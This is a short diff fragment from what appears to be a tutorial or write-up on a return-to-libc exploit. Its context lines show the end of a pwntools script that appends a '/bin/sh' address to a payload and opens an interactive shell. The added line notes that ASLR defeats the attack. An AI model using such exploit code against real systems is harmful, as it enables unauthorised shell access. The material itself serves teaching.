@@ -141,3 +141,5 @@ payload += bin_sh_addr
 p.sendline(payload)
 p.interactive()
 ```
+
+For security such as ASLR, this will not work, because it will also randomize the addresses of key functions and arguments for this attack.
